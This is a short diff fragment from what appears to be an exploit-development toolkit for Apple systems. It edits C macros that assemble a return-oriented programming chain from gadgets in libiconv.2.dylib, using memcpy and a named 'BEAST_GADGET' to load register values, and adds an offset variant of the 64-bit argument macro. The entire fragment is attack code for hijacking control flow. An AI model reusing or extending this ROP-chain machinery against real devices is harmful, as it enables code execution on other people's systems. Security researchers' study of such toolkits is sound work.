@@ -426,7 +426,7 @@ add_x0_gadget (from libiconv.2.dylib):
 #define ROP_VAR_ARG(name,nr) ROP_VAR_ARG_W_OFFSET(name,nr,0)
 
 // same as above but it doesn't copy the pointer but a uint64_t value
-#define ROP_VAR_ARG64(name,nr) \
+#define ROP_VAR_ARG64_W_OFFSET(name,nr,offset) \
 	if (rop_var_arg_num == -1) {printf("YOU NEED TO USE ROP_VAR_ARG_HOW_MANY BEFORE USING ROP_VAR_ARG_* (line:%d)\n",__LINE__);exit(1);} \
 	rop_var_arg_num--; \
 	ADD_COMMENT("rop var arg 64"); \
@@ -440,7 +440,7 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* x28 */ \
 	ADD_CODE_GADGET((offsets)->memcpy); /* x27 */ \
 	ADD_REL_OFFSET_GADGET((8*8+7*8+rop_var_tmp_nr*8+rop_var_arg_num*16*8)); /* x26 */ \
-	ADD_ROP_VAR_GADGET(name); /* x25 */ \
+	ADD_ROP_VAR_GADGET_W_OFFSET(name,offset); /* x25 */ \
 	ADD_STATIC_GADGET(8); /* x24 */ \
 	ADD_GADGET(); /* x23 */ \
 	ADD_GADGET(); /* x22 */ \
@@ -449,6 +449,8 @@ add_x0_gadget (from libiconv.2.dylib):
 	ADD_GADGET(); /* x19 */ \
 	ADD_GADGET(); /* x29 */ \
 	ADD_CODE_GADGET((offsets)->BEAST_GADGET); // x30 
+
+#define ROP_VAR_ARG64(name,nr) ROP_VAR_ARG64_W_OFFSET(name,nr,0);
 
 #define SET_X0_FROM_ROP_VAR(name) \
 	ADD_COMMENT("set x0 from rop var"); \
